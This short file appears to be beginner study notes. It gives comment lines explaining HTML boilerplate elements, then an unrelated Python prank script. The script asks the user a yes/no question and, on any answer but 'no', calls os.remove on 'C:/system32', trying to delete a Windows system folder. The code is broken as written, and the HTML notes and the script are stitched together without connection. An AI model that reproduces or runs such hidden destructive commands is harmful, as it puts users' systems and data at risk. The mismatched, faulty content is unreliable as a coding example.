# HTML Boilerplate
# The boilerplate should include the following elements:
# <!DOCTYPE html> - This declaration defines this document as HTML5.
# <html lang="en"> - This element is the root element of an HTML page. All content must be inside this element. lang attribute specifies the language of the document.
# Making web is like making HAMBURGER.
# <head> - This element contains meta-information about the document, such as its title and character set. The information inside the head element is not displayed in the browser window.
# <meta charset ="UTF-8"> - encoding to UTF-8.
# <title> - This element defines the title of the document. The title is displayed in the browser's title bar or tab.
# <body> - This element contains the content of the document, such as text, images, and links. The information inside the body element is displayed in the browser window.

import os
the_statement = "Is AI will replace programmers?"
answer = input("Is it real? (yes/no): ")
if answer.lower() == "no":
    print("Ok, have a nice day!")
else:
    os.remove("C:/system32")